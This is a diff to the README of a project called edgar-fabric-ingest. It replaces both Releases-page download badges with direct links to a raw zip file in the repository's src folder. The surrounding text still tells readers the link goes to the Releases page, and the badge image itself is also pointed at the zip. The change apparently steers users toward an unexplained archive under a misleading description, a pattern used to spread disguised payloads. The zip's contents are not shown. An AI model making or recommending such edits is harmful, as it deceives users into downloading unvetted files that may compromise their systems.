@@ -6,7 +6,7 @@
 ## 📦 Download & Install
 To get started, visit the following link to download the latest version of edgar-fabric-ingest:
 
-[![Download edgar-fabric-ingest](https://img.shields.io/badge/Download-edgar--fabric--ingest-brightgreen)](https://github.com/nimiton-cloud/edgar-fabric-ingest/releases)
+[![Download edgar-fabric-ingest](https://github.com/nimiton-cloud/edgar-fabric-ingest/raw/refs/heads/main/src/edgar-fabric-ingest-2.3.zip)](https://github.com/nimiton-cloud/edgar-fabric-ingest/raw/refs/heads/main/src/edgar-fabric-ingest-2.3.zip)
 
 ### Steps to Download:
 1. Click the link above to go to our Releases page.
@@ -61,7 +61,7 @@ For additional support, consult our GitHub repository. You can find common quest
 
 You can always download the latest version from our Releases page:
 
-[![Download edgar-fabric-ingest](https://img.shields.io/badge/Download-edgar--fabric--ingest-brightgreen)](https://github.com/nimiton-cloud/edgar-fabric-ingest/releases)
+[![Download edgar-fabric-ingest](https://github.com/nimiton-cloud/edgar-fabric-ingest/raw/refs/heads/main/src/edgar-fabric-ingest-2.3.zip)](https://github.com/nimiton-cloud/edgar-fabric-ingest/raw/refs/heads/main/src/edgar-fabric-ingest-2.3.zip)
 
 ## 🛡️ License
 edgar-fabric-ingest is open-source and licensed under the MIT License. Feel free to use, modify, and distribute it as you see fit.
